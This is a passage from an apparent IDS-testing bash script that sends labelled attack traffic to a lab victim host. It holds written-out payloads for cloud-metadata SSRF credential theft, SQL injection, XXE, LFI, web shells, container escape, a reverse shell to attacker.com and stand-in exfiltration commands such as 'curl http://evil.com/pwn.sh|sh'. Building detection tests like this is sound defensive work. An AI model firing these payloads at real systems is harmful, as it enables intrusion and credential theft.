curl -s -o /dev/null -H "Referer: http://malware-traffic-analysis.net/exploit.html" \
  "http://${VICTIM_IP}/" || true

# ---------- False Positive Baseline ----------
# These are legitimate requests that should NOT trigger alerts.
# If any of these fire rules, we have tuning issues.

echo "[21/29] False positive baseline (legitimate traffic)"

# Normal browser-like GET requests
curl -s -o /dev/null -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36" \
  "http://${VICTIM_IP}/" || true
curl -s -o /dev/null -A "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15" \
  "http://${VICTIM_IP}/index.html" || true

# Standard API-style requests
curl -s -o /dev/null -X POST -H "Content-Type: application/json" \
  -d '{"username":"alice","email":"alice@example.com"}' "http://${VICTIM_IP}/api/users" || true
curl -s -o /dev/null -X GET -H "Accept: application/json" "http://${VICTIM_IP}/api/status" || true

# Legitimate search queries
curl -s -o /dev/null "http://${VICTIM_IP}/search?q=hello+world" || true
curl -s -o /dev/null "http://${VICTIM_IP}/search?q=product+reviews" || true

# Normal form submissions
curl -s -o /dev/null -X POST -d "name=John&email=john@example.com&message=Contact" \
  "http://${VICTIM_IP}/contact" || true

# Standard image/asset requests
curl -s -o /dev/null "http://${VICTIM_IP}/images/logo.png" || true
curl -s -o /dev/null "http://${VICTIM_IP}/css/style.css" || true
curl -s -o /dev/null "http://${VICTIM_IP}/js/app.js" || true

# Legitimate DNS lookups to well-known services
dig @1.1.1.1 google.com +short 2>/dev/null || true
dig @1.1.1.1 cloudflare.com +short 2>/dev/null || true
dig @1.1.1.1 github.com +short 2>/dev/null || true

# Normal HTTPS handshake to legitimate sites (from Kali, now mirrored)
curl -s -o /dev/null "https://www.google.com/" 2>/dev/null || true
curl -s -o /dev/null "https://api.github.com/" 2>/dev/null || true

# Legitimate redirects
curl -s -o /dev/null -L "http://${VICTIM_IP}/redirect?to=/home" || true

# Standard language/charset headers
curl -s -o /dev/null -H "Accept-Language: en-US,en;q=0.9" -H "Accept-Encoding: gzip, deflate" \
  "http://${VICTIM_IP}/" || true

# ---------- AWS-Specific Attacks ----------

echo "[22/29] AWS-specific attack patterns"

# ===== IMDS Exploitation Variants =====

# Standard IMDSv1 (baseline)
curl -s -o /dev/null "http://${VICTIM_IP}/?url=http://169.254.169.254/latest/meta-data/" || true

# IMDSv2 token request
curl -s -o /dev/null -X PUT "http://${VICTIM_IP}/?target=http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" || true

# IMDS decimal notation bypass (169.254.169.254 = 2852039166)
curl -s -o /dev/null "http://${VICTIM_IP}/?url=http://2852039166/latest/meta-data/" || true

# IMDS octal notation bypass
curl -s -o /dev/null "http://${VICTIM_IP}/?url=http://0251.0376.0251.0376/latest/meta-data/" || true

# IMDS IPv6 bypass
curl -s -o /dev/null "http://${VICTIM_IP}/?url=http://[fd00:ec2::254]/latest/meta-data/" || true

# IMDS credential theft target
curl -s -o /dev/null "http://${VICTIM_IP}/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" || true

# IMDS user-data theft
curl -s -o /dev/null "http://${VICTIM_IP}/?url=http://169.254.169.254/latest/user-data" || true

# ===== Container Credential Endpoints =====

# ECS task metadata v2
curl -s -o /dev/null "http://${VICTIM_IP}/?url=http://169.254.170.2/v2/metadata" || true
curl -s -o /dev/null "http://${VICTIM_IP}/?url=http://169.254.170.2/v2/credentials/abc123" || true

# ECS task metadata v4
curl -s -o /dev/null "http://${VICTIM_IP}/?url=http://169.254.170.2/v4/task" || true

# Lambda runtime API abuse
curl -s -o /dev/null "http://${VICTIM_IP}/?url=http://localhost:9001/2018-06-01/runtime/invocation/next" || true

# EKS service account token path
curl -s -o /dev/null "http://${VICTIM_IP}/?path=/var/run/secrets/kubernetes.io/serviceaccount/token" || true

# Docker socket access patterns
curl -s -o /dev/null "http://${VICTIM_IP}/?url=unix:///var/run/docker.sock/containers/json" || true

# ===== S3 Bucket Enumeration via DNS =====

# Common S3 bucket naming patterns
for bucket in backup prod staging dev data logs assets; do
  dig @1.1.1.1 "companyname-${bucket}.s3.amazonaws.com" +short 2>/dev/null || true
  dig @1.1.1.1 "company-${bucket}.s3.amazonaws.com" +short 2>/dev/null || true
done

# S3 bucket listing attempts
curl -s -o /dev/null "http://${VICTIM_IP}/?url=https://companyname-backup.s3.amazonaws.com/?list-type=2" || true
curl -s -o /dev/null "http://${VICTIM_IP}/?url=https://companyname-prod.s3.amazonaws.com/" || true

# ===== AWS Credential Format Exfiltration =====

# Simulated AKIA key format in POST body (data exfil pattern)
curl -s -o /dev/null -X POST \
  -d 'key=AKIAIOSFODNN7EXAMPLE&secret=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY' \
  "http://${VICTIM_IP}/api/submit" || true

# Session token pattern exfil
curl -s -o /dev/null -X POST \
  -d 'token=AQoDYXdzEHowUGT3dj/mVJLkLM3+cZkp1fakefakefake' \
  "http://${VICTIM_IP}/upload" || true

# .aws/credentials file probing
curl -s -o /dev/null "http://${VICTIM_IP}/../../../home/user/.aws/credentials" || true
curl -s -o /dev/null "http://${VICTIM_IP}/../../../root/.aws/config" || true
curl -s -o /dev/null "http://${VICTIM_IP}/.aws/credentials" || true

# Git config exposure (often contains AWS keys)
curl -s -o /dev/null "http://${VICTIM_IP}/.git/config" || true
curl -s -o /dev/null "http://${VICTIM_IP}/.gitconfig" || true

# CloudFormation template probes
curl -s -o /dev/null "http://${VICTIM_IP}/cfn-template.yaml" || true
curl -s -o /dev/null "http://${VICTIM_IP}/cloudformation.json" || true

# SSM parameter store probes
curl -s -o /dev/null "http://${VICTIM_IP}/ssm-parameters/secure/" || true

# ===== AWS CLI/SDK User-Agents (Unusual Source) =====

curl -s -o /dev/null -A "aws-cli/2.15.0 Python/3.11.0 Linux/5.15.0 exec-env/EC2" \
  "http://${VICTIM_IP}/admin" || true
curl -s -o /dev/null -A "Boto3/1.34.0 Python/3.11.0 Linux/5.15.0 Botocore/1.34.0" \
  "http://${VICTIM_IP}/api/v1/users" || true
curl -s -o /dev/null -A "terraform-provider-aws/5.50.0 (+https://registry.terraform.io)" \
  "http://${VICTIM_IP}/" || true

# ===== Capital One Attack Chain Simulation =====
# SSRF → IMDS → steal credentials → sts:AssumeRole → S3 exfil

# Step 1: SSRF to IMDS
curl -s -o /dev/null "http://${VICTIM_IP}/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" || true
# Step 2: Fetch credentials for role
curl -s -o /dev/null "http://${VICTIM_IP}/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role" || true
# Step 3: STS AssumeRole simulation
curl -s -o /dev/null -X POST -d 'Action=AssumeRole&RoleArn=arn:aws:iam::123456789012:role/TargetRole&RoleSessionName=pwnd' \
  "http://${VICTIM_IP}/?url=https://sts.amazonaws.com/" || true
# Step 4: S3 list (exfil)
curl -s -o /dev/null "http://${VICTIM_IP}/?url=https://s3.amazonaws.com/target-bucket/?list-type=2" || true

# ===== Cloud Malware C2 Patterns =====

# TeamTNT — AWS credential scraper user-agent
curl -s -o /dev/null -A "curl/7.58.0" \
  "http://${VICTIM_IP}/aws-login/ecs" || true

# Kinsing — cryptominer binary download pattern
curl -s -o /dev/null "http://${VICTIM_IP}/kinsing" || true
curl -s -o /dev/null "http://${VICTIM_IP}/kdevtmpfsi" || true

# Denonia — Lambda cryptominer
curl -s -o /dev/null "http://${VICTIM_IP}/denonia.go" || true
dig @1.1.1.1 "denonia.xyz" +short 2>/dev/null || true

# WatchDog AWS cryptominer
curl -s -o /dev/null "http://${VICTIM_IP}/watchdog.sh" || true

# ===== AWS Service Endpoint Probing =====

# Probe for internal access to AWS services
dig @1.1.1.1 "secretsmanager.us-east-1.amazonaws.com" +short 2>/dev/null || true
dig @1.1.1.1 "ec2-instance-connect.us-east-1.amazonaws.com" +short 2>/dev/null || true
dig @1.1.1.1 "sts.amazonaws.com" +short 2>/dev/null || true

# S3 subdomain takeover probes (NoSuchBucket targets)
for name in abandoned-site-123 old-company-prod decomm-2019; do
  curl -s -o /dev/null "https://${name}.s3.amazonaws.com/" 2>/dev/null || true
done

# ===== EKS/K8s API Abuse =====

# Kubernetes API server probe
curl -s -o /dev/null -k "https://${VICTIM_IP}:6443/api/v1/namespaces/default/pods" 2>/dev/null || true
curl -s -o /dev/null -k "https://${VICTIM_IP}:10250/metrics" 2>/dev/null || true

# Service account token use
curl -s -o /dev/null -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6ImZha2UifQ.fake.token" \
  "http://${VICTIM_IP}/api/v1/secrets" || true

# ---------- Azure & GCP Cloud Attacks ----------

echo "[23/29] Azure and GCP cloud attack patterns"

# Azure IMDS (requires Metadata: true header)
curl -s -o /dev/null -H "Metadata: true" \
  "http://${VICTIM_IP}/?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01" || true
curl -s -o /dev/null -H "Metadata: true" \
  "http://${VICTIM_IP}/?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01" || true

# GCP Metadata Service (requires Metadata-Flavor: Google)
curl -s -o /dev/null -H "Metadata-Flavor: Google" \
  "http://${VICTIM_IP}/?url=http://metadata.google.internal/computeMetadata/v1/instance/" || true
curl -s -o /dev/null -H "Metadata-Flavor: Google" \
  "http://${VICTIM_IP}/?url=http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" || true

# Azure Storage blob enumeration via DNS
for bucket in backup prod data logs; do
  dig @1.1.1.1 "companyname${bucket}.blob.core.windows.net" +short 2>/dev/null || true
done

# GCP Cloud Storage enumeration
for bucket in backup prod data logs; do
  dig @1.1.1.1 "companyname-${bucket}.storage.googleapis.com" +short 2>/dev/null || true
done

# Azure Cosmos DB / SQL probes
dig @1.1.1.1 "companyname.documents.azure.com" +short 2>/dev/null || true
dig @1.1.1.1 "companyname.database.windows.net" +short 2>/dev/null || true

# Azure AD token theft attempt
curl -s -o /dev/null -X POST \
  -d 'grant_type=password&username=admin@company.onmicrosoft.com&password=P@ssw0rd' \
  "http://${VICTIM_IP}/?url=https://login.microsoftonline.com/common/oauth2/token" || true

# GCP service account key format exfiltration
curl -s -o /dev/null -X POST \
  -d '{"type":"service_account","project_id":"my-project","private_key":"-----BEGIN PRIVATE KEY-----","client_email":"sa@my-project.iam.gserviceaccount.com"}' \
  "http://${VICTIM_IP}/api/exfil" || true

# ---------- Web Shells & Advanced Web Attacks ----------

echo "[24/29] Web shells and advanced web attacks"

# Common web shell filenames
for shell in c99.php r57.php b374k.php wso.php shell.php cmd.php adminer.php mini.php; do
  curl -s -o /dev/null "http://${VICTIM_IP}/${shell}" || true
  curl -s -o /dev/null "http://${VICTIM_IP}/uploads/${shell}" || true
done

# China Chopper web shell pattern
curl -s -o /dev/null -X POST --data 'z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO2VjaG8oIi0+fCIpOw==' \
  "http://${VICTIM_IP}/shell.php" || true

# JSP/ASPX web shells
curl -s -o /dev/null "http://${VICTIM_IP}/cmd.jsp?cmd=id" || true
curl -s -o /dev/null "http://${VICTIM_IP}/cmd.aspx" || true

# Time-based SQL injection
curl -s -o /dev/null "http://${VICTIM_IP}/?id=1%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))abc)" || true
curl -s -o /dev/null "http://${VICTIM_IP}/?id=1';%20WAITFOR%20DELAY%20'00:00:05'--" || true
curl -s -o /dev/null "http://${VICTIM_IP}/?id=1%20AND%20extractvalue(1,concat(0x7e,(SELECT%20version())))" || true
curl -s -o /dev/null "http://${VICTIM_IP}/?id=1%20UNION%20SELECT%20LOAD_FILE('/etc/passwd')" || true
curl -s -o /dev/null "http://${VICTIM_IP}/?id=1%20INTO%20OUTFILE%20'/var/www/html/shell.php'" || true

# Expanded XSS patterns
curl -s -o /dev/null "http://${VICTIM_IP}/?q=%3Csvg%2Fonload%3Dalert(1)%3E" || true
curl -s -o /dev/null "http://${VICTIM_IP}/?q=javascript%3Aalert(document.domain)" || true
curl -s -o /dev/null "http://${VICTIM_IP}/?q=%3Cbody%20onload%3Dalert(1)%3E" || true

# XXE injection
curl -s -o /dev/null -X POST -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' \
  "http://${VICTIM_IP}/api/xml" || true

# Server-side template injection (SSTI)
curl -s -o /dev/null "http://${VICTIM_IP}/?name={{7*7}}" || true
curl -s -o /dev/null "http://${VICTIM_IP}/?name=\${7*7}" || true

# LFI/RFI with PHP wrappers
curl -s -o /dev/null "http://${VICTIM_IP}/?page=php://filter/convert.base64-encode/resource=index.php" || true
curl -s -o /dev/null "http://${VICTIM_IP}/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=" || true
curl -s -o /dev/null "http://${VICTIM_IP}/?page=expect://id" || true

# NoSQL injection (MongoDB style)
curl -s -o /dev/null -X POST -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}' \
  "http://${VICTIM_IP}/login" || true

# ---------- Active Directory / LDAP / Kerberos Attacks ----------

echo "[25/29] Active Directory, LDAP, and Kerberos attacks"

# LDAP injection patterns
curl -s -o /dev/null "http://${VICTIM_IP}/?user=*)(objectClass=*" || true
curl -s -o /dev/null "http://${VICTIM_IP}/?user=admin)(%26(password=*)" || true
curl -s -o /dev/null "http://${VICTIM_IP}/search?filter=(cn=*)(|(uid=*))" || true

# LDAP anonymous bind probing
for port in 389 636 3268 3269; do
  timeout 2 bash -c "exec 3<>/dev/tcp/${VICTIM_IP}/${port} && echo 'BindRequest' >&3" 2>/dev/null || true
done

# Kerberos AS-REQ/AS-REP pattern probes (port 88 TCP/UDP)
timeout 2 bash -c "exec 3<>/dev/tcp/${VICTIM_IP}/88 && echo 'ASREQ' >&3" 2>/dev/null || true

# AS-REP Roasting - request TGT for accounts without preauth
# Simulate via HTTP POST with Kerberos-like payload
curl -s -o /dev/null -X POST --data-binary $'\x6a\x81\x93\x30\x81\x90\xa1\x03\x02\x01\x05\xa2\x03\x02\x01\x0a\xa4\x81\x83\x30\x81\x80' \
  "http://${VICTIM_IP}/kerberos/asreq" || true

# Kerberoasting - request service tickets
curl -s -o /dev/null "http://${VICTIM_IP}/?spn=HTTP/webserver.company.local" || true
curl -s -o /dev/null "http://${VICTIM_IP}/?spn=MSSQLSvc/sqlserver.company.local:1433" || true

# Kerberos SMB authentication brute force
hydra -l Administrator -P /dev/null -t 2 -w 3 -f "smb://${VICTIM_IP}" -m "kerberos" 2>/dev/null || true

# Pass-the-Hash pattern (NTLM relay)
curl -s -o /dev/null -H "Authorization: NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==" \
  "http://${VICTIM_IP}/iis/admin" || true

# DCSync pattern (DRSUAPI replication request)
curl -s -o /dev/null -X POST -d 'service=DRSUAPI&operation=GetNCChanges' \
  "http://${VICTIM_IP}/dcsync" || true

# BloodHound / SharpHound fingerprints
curl -s -o /dev/null -A "Microsoft-CryptoAPI/10.0" \
  "http://${VICTIM_IP}/sharphound" || true

# DNS queries for domain controller discovery (SRV records)
dig @1.1.1.1 SRV _ldap._tcp.dc._msdcs.company.local +short 2>/dev/null || true
dig @1.1.1.1 SRV _kerberos._tcp.company.local +short 2>/dev/null || true
dig @1.1.1.1 SRV _gc._tcp.company.local +short 2>/dev/null || true

# ADCS (Active Directory Certificate Services) abuse
curl -s -o /dev/null "http://${VICTIM_IP}/certsrv/" || true
curl -s -o /dev/null "http://${VICTIM_IP}/certsrv/certfnsh.asp" || true

# LLMNR/NBT-NS poisoning patterns
curl -s -o /dev/null -A "Responder" "http://${VICTIM_IP}/" || true

# Impacket tool fingerprints
curl -s -o /dev/null -A "impacket" "http://${VICTIM_IP}/" || true
curl -s -o /dev/null -A "smbclient" "http://${VICTIM_IP}/" || true

# GPP (Group Policy Preferences) password hunting
curl -s -o /dev/null "http://${VICTIM_IP}/SYSVOL/policies/Groups.xml" || true
curl -s -o /dev/null "http://${VICTIM_IP}/Domain/Policies/xxx/MACHINE/Preferences/Groups/Groups.xml" || true

# ntds.dit access attempts
curl -s -o /dev/null "http://${VICTIM_IP}/windows/ntds/ntds.dit" || true

# ---------- Supply Chain Attacks ----------

echo "[26/29] Supply chain and typosquatting attacks"

# npm typosquatting packages (historical real ones)
for pkg in eventstram cross-env.js crossenv node-sass-build event-streamm reqest coffe-script; do
  curl -s -o /dev/null "http://${VICTIM_IP}/npm/${pkg}" || true
  dig @1.1.1.1 "registry.npmjs.org" +short 2>/dev/null || true
done

# pip typosquatting packages
for pkg in reqeusts urllib4 pyhton-dateutil beautifullsoup colourama crypt tenserflow; do
  curl -s -o /dev/null "http://${VICTIM_IP}/pypi/${pkg}" || true
done

# Ruby gem typosquatting
for pkg in atlas-client rest-client-src atlas_client omniauth-facebook-rails jquery-rails; do
  curl -s -o /dev/null "http://${VICTIM_IP}/gems/${pkg}" || true
done

# Malicious npm postinstall pattern (data exfiltration)
curl -s -o /dev/null -X POST -d '{"name":"evil-package","scripts":{"postinstall":"curl http://attacker.com/$(whoami)"}}' \
  "http://${VICTIM_IP}/npm/publish" || true

# Dependency confusion — request private-sounding package names
for name in company-internal-utils acme-secret-lib corp-shared-db; do
  curl -s -o /dev/null "http://${VICTIM_IP}/npm/${name}" || true
done

# Compromised build tool user-agents
curl -s -o /dev/null -A "npm/10.2.0 node/v20.10.0" "http://${VICTIM_IP}/api/keys" || true
curl -s -o /dev/null -A "pip/23.3.1" "http://${VICTIM_IP}/api/secrets" || true

# Terraform Registry spoofing
for tld in .io .xyz .tk; do
  curl -s -o /dev/null "http://${VICTIM_IP}/?url=https://registry.terraform${tld}/v1/providers/aws/aws" || true
done

# GitHub Actions token theft pattern
curl -s -o /dev/null -X POST -d 'token=ghs_fakefakefakefakefakefakefakefakefake01&repo=victim/repo' \
  "http://${VICTIM_IP}/api/exfil" || true

# Docker Hub image typosquatting
for img in ubutnu alpine-linux debain-stable centos7-lite; do
  curl -s -o /dev/null "http://${VICTIM_IP}/docker/${img}" || true
done

# PyPI package with suspicious install script
curl -s -o /dev/null -X POST -d 'setup.py=import os;os.system("curl http://evil.com/pwn.sh|sh")' \
  "http://${VICTIM_IP}/pypi/upload" || true

# npm postinstall cryptominer (historical pattern)
curl -s -o /dev/null -X POST -d '{"scripts":{"postinstall":"wget http://pool.xmrig.com/miner && chmod +x miner && ./miner"}}' \
  "http://${VICTIM_IP}/npm/publish" || true

# ---------- Advanced C2 Frameworks ----------

echo "[27/29] Advanced C2 frameworks and behavioral patterns"

# Havoc C2
curl -s -o /dev/null "http://${VICTIM_IP}/news.html?id=$(date +%s)" \
  -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" || true

# Brute Ratel (BRC4)
curl -s -o /dev/null "http://${VICTIM_IP}/api/search/$(head -c 8 /dev/urandom | xxd -p)" \
  -A "Mozilla/5.0 (compatible; MSIE 9.0)" || true

# Mythic C2
curl -s -o /dev/null -X POST -H "Accept: text/html" \
  -d '{"action":"get_tasking","tasking_size":1}' \
  "http://${VICTIM_IP}/api/v1.4/agent_message" || true

# Poshc2 / Empire
curl -s -o /dev/null -A "Mozilla/5.0 (Windows NT; Trident/7.0)" \
  "http://${VICTIM_IP}/news.php?task=$(head -c 16 /dev/urandom | xxd -p)" || true

# BEACON sleep-and-jitter periodic checkin
for i in 1 2 3 4 5; do
  curl -s -o /dev/null -A "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)" \
    "http://${VICTIM_IP}/submit.php?id=CA00$i" || true
done

# DNS beaconing (periodic same-structure queries)
for i in 1 2 3 4 5; do
  dig @1.1.1.1 "beacon-$(date +%s).c2.evil.com" +short 2>/dev/null || true
done

# ICMP tunneling (large ping with fixed payload)
sudo ping -c 3 -s 1024 -p 4141414141414141 "${VICTIM_IP}" 2>/dev/null || true

# Reverse shell command patterns in URLs
curl -s -o /dev/null "http://${VICTIM_IP}/?cmd=bash%20-i%20%3E%26%20/dev/tcp/attacker.com/4444%200%3E%261" || true
curl -s -o /dev/null "http://${VICTIM_IP}/?cmd=python%20-c%20'import%20socket,subprocess,os'" || true

# DoH to cloudflare-dns (potential tunneling channel)
curl -s -o /dev/null "http://${VICTIM_IP}/?url=https://cloudflare-dns.com/dns-query?name=evil.com" || true


# ---------- Container Escape & Docker/K8s Attacks ----------

echo "[28/29] Container escape and Docker/K8s attacks"

# Docker socket exploitation
curl -s -o /dev/null "http://${VICTIM_IP}/?url=unix:///var/run/docker.sock/containers/create" || true
curl -s -o /dev/null -X POST -d '{"Image":"alpine","Cmd":["nsenter","--mount=/proc/1/ns/mnt","sh"],"HostConfig":{"Privileged":true,"PidMode":"host"}}' \
  "http://${VICTIM_IP}/docker/v1.41/containers/create" || true

# Kubernetes API abuse
curl -s -o /dev/null -k "https://${VICTIM_IP}:6443/api/v1/namespaces/default/pods" 2>/dev/null || true
curl -s -o /dev/null -k "https://${VICTIM_IP}:6443/api/v1/namespaces/kube-system/secrets" 2>/dev/null || true
curl -s -o /dev/null -k "https://${VICTIM_IP}:6443/apis/rbac.authorization.k8s.io/v1/clusterrolebindings" 2>/dev/null || true

# Kubelet abuse (port 10250)
curl -s -o /dev/null -k "https://${VICTIM_IP}:10250/pods" 2>/dev/null || true
curl -s -o /dev/null -k "https://${VICTIM_IP}:10250/exec/default/pod/container?command=id" 2>/dev/null || true

# etcd direct access (unauthenticated)
curl -s -o /dev/null "http://${VICTIM_IP}:2379/v2/keys/?recursive=true" 2>/dev/null || true

# Container runtime socket enumeration
for sock in docker.sock containerd.sock crio.sock; do
  curl -s -o /dev/null "http://${VICTIM_IP}/?path=/var/run/${sock}" || true
done

# Privileged pod creation attempt
curl -s -o /dev/null -X POST -H "Content-Type: application/yaml" \
  --data 'apiVersion: v1\nkind: Pod\nspec:\n  containers:\n  - securityContext:\n      privileged: true' \
  "http://${VICTIM_IP}/api/v1/namespaces/default/pods" || true

# Cgroup escape (release_agent exploit)
curl -s -o /dev/null "http://${VICTIM_IP}/?path=/sys/fs/cgroup/release_agent" || true

# Capabilities abuse
curl -s -o /dev/null "http://${VICTIM_IP}/?cap=CAP_SYS_ADMIN" || true

# K8s service account token theft
curl -s -o /dev/null "http://${VICTIM_IP}/?path=/var/run/secrets/kubernetes.io/serviceaccount/token" || true

# Container image enumeration
curl -s -o /dev/null "http://${VICTIM_IP}/v2/_catalog" || true
curl -s -o /dev/null "http://${VICTIM_IP}/v2/library/alpine/manifests/latest" || true

# ---------- API Abuse (GraphQL, REST, Webhooks) ----------

echo "[29/29] API abuse attacks"

# GraphQL introspection
curl -s -o /dev/null -X POST -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name}}}}"}' \
  "http://${VICTIM_IP}/graphql" || true
curl -s -o /dev/null "http://${VICTIM_IP}/graphql?query=%7B__schema%7Btypes%7Bname%7D%7D%7D" || true

# GraphQL batch/alias abuse (DoS)
curl -s -o /dev/null -X POST -H "Content-Type: application/json" \
  -d '[{"query":"{users{id}}"},{"query":"{users{id}}"},{"query":"{users{id}}"}]' \
  "http://${VICTIM_IP}/graphql" || true

# REST API mass assignment
curl -s -o /dev/null -X POST -H "Content-Type: application/json" \
  -d '{"name":"user","email":"u@x.com","role":"admin","is_admin":true}' \
  "http://${VICTIM_IP}/api/users" || true

# IDOR (Insecure Direct Object Reference)
for id in 1 2 3 100 1000 admin root; do
  curl -s -o /dev/null "http://${VICTIM_IP}/api/users/${id}/private" || true
done

# JWT manipulation
curl -s -o /dev/null -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ." \
  "http://${VICTIM_IP}/api/admin" || true

# API key brute force
for key in test123 admin secret apikey123 demo12345; do
  curl -s -o /dev/null -H "X-API-Key: ${key}" "http://${VICTIM_IP}/api/status" || true
done

# Webhook poisoning (SSRF via webhook URL)
curl -s -o /dev/null -X POST -H "Content-Type: application/json" \
  -d '{"webhook_url":"http://169.254.169.254/latest/meta-data/"}' \
  "http://${VICTIM_IP}/api/webhooks" || true

# HTTP verb tampering
curl -s -o /dev/null -X DELETE "http://${VICTIM_IP}/api/users/1" || true
curl -s -o /dev/null -X PUT -H "X-HTTP-Method-Override: DELETE" "http://${VICTIM_IP}/api/users/1" || true

# OpenAPI/Swagger enumeration
curl -s -o /dev/null "http://${VICTIM_IP}/swagger.json" || true
curl -s -o /dev/null "http://${VICTIM_IP}/openapi.json" || true
curl -s -o /dev/null "http://${VICTIM_IP}/api-docs" || true
curl -s -o /dev/null "http://${VICTIM_IP}/v3/api-docs" || true

# Rate-limit bypass via headers
curl -s -o /dev/null -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 127.0.0.1" \
  "http://${VICTIM_IP}/api/login" || true
curl -s -o /dev/null -H "X-Originating-IP: 127.0.0.1" \
  "http://${VICTIM_IP}/api/login" || true

# ---------- SaaS Exfil + Tunneling Service IOCs (Iteration 3) ----------
echo "[30] SaaS exfil destinations + tunneling service IOCs"

# Each connect attempt is best-effort; some endpoints may rate-limit or
# refuse, but the TLS handshake / DNS query happens before that and is
# what our rules match on.
for host in pastebin.com transfer.sh discord.com gist.githubusercontent.com telegra.ph; do
  curl -s -o /dev/null --max-time 5 "https://${host}/" 2>/dev/null || true
  dig @1.1.1.1 "${host}" +short > /dev/null 2>&1 || true
done

for host in test.ngrok.io test.trycloudflare.com test.serveo.net test.loca.lt; do
  dig @1.1.1.1 "${host}" +short > /dev/null 2>&1 || true
  curl -s -o /dev/null --max-time 5 "https://${host}/" 2>/dev/null || true
done

# JA3 fingerprint trigger — explicit cipher choice produces a distinct
# ClientHello fingerprint. abuse.ch rule pack has hashes for
# specific malware C2 stacks; this won't match those (we're using
# benign curl) but proves the JA3 pipeline is alive.
curl -s -o /dev/null --max-time 5 \
  --tls-max 1.2 --ciphers ECDHE-RSA-AES128-SHA256 \
  https://1.1.1.1/ 2>/dev/null || true

# ---------- Lateral Movement — SMB / DCERPC: moved to background group run_lateral_smb_group ----------

# ---------- JA3 fingerprint triggers (Iteration 5) ----------
echo "[32] JA3 TLS fingerprint probes"

# Different cipher orders produce different JA3 hashes. abuse.ch ja3 rules
# match specific hashes for known-malicious stacks. These curl probes
# won't match malware hashes (we're benign curl) but they exercise the
# JA3 pipeline — confirms the 300+ loaded rules can fire, and gives
# Zeek/Suricata ssl.log an entry with ja3.hash populated for each TLS
# connection.
for cipher in \
  'ECDHE-RSA-AES128-SHA256' \
  'ECDHE-RSA-AES256-SHA384' \
  'AES128-SHA' \
  'DHE-RSA-AES128-SHA'; do
  curl -s -o /dev/null --max-time 5 --tls-max 1.2 --ciphers "${cipher}" \
    https://1.1.1.1/ 2>/dev/null || true
done

# ---------- Intel-feed trigger probes (Iteration 7) ----------
# Query a few known-bad indicators from abuse.ch feeds so Zeek's
# Intel Framework fires a notice on intel.log. We can't hard-code
# specific IOCs (they rotate), so fetch a sample at runtime.
BAD_DOMAIN=$(curl -fsSL --max-time 10 \
  https://urlhaus.abuse.ch/downloads/hostfile/ 2>/dev/null \
  | awk '/^[^#]/ && NF {print $1; exit}')
if [ -n "$BAD_DOMAIN" ]; then
  dig @1.1.1.1 "$BAD_DOMAIN" +short > /dev/null 2>&1 || true
  curl -s -o /dev/null --max-time 5 "http://$BAD_DOMAIN/" 2>/dev/null || true
fi

BAD_IP=$(curl -fsSL --max-time 10 \
  https://feodotracker.abuse.ch/downloads/ipblocklist.txt 2>/dev/null \
  | awk '/^[0-9]/ {print $1; exit}')
if [ -n "$BAD_IP" ]; then
  curl -s -o /dev/null --max-time 5 "http://$BAD_IP/" 2>/dev/null || true
fi

# Python requests with explicit old ssl (produces legacy-looking
# ClientHello — historically matches some abuse.ch malware JA3s)
python3 -c '
import ssl, socket
ctx = ssl.create_default_context()
ctx.minimum_version = ssl.TLSVersion.TLSv1_2
ctx.maximum_version = ssl.TLSVersion.TLSv1_2
ctx.set_ciphers("AES128-SHA:ECDHE-RSA-AES128-SHA")
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
s = socket.create_connection(("1.1.1.1", 443), timeout=5)
ss = ctx.wrap_socket(s, server_hostname="1.1.1.1")
ss.close()
' 2>/dev/null || true

# ---------- Nuclei CVE template sweep ----------
# Runs ProjectDiscovery nuclei against the Vulhub listeners (port 8080
# Spring / 8983 Solr) plus the baseline nginx on :80. Rate-limited and
# time-bounded so the sweep can't blow the attack-battery budget.
# -tags cve,oast restricts to CVE templates; most will 404/miss but the
# ones that DO match produce high-signal labeled traffic.
# nuclei sweep + flightsim traffic: moved to background groups
# run_nuclei_group + run_flightsim_group (see top of script).

# ---------- GitHub token exfil — plain-HTTP POST (SIDs 9000504 / 9000505) ----------
# Rules 9000504/9000505 match on http.request_body with pcre:/gh[sp]_[A-Za-z0-9]{36,}/
# so the POST must be plain HTTP (TLS hides the body) and the token must
# be >= 36 chars after the prefix. The existing probe at line ~779 had
# only 20 chars of fake token — below threshold. These POSTs go to
# nginx on :80 which responds 200 ok.
echo "[33a] github-token-exfil (plain-HTTP POST with full-length ghp_/ghs_ tokens)"
timeout 10 curl -s -o /dev/null --max-time 5 -X POST \
  -d 'token=ghp_0123456789abcdef0123456789abcdef01234567' \
  "http://${VICTIM_IP}/api/exfil" || true
timeout 10 curl -s -o /dev/null --max-time 5 -X POST \
  -d 'token=ghs_abcdef0123456789abcdef0123456789abcdef01' \
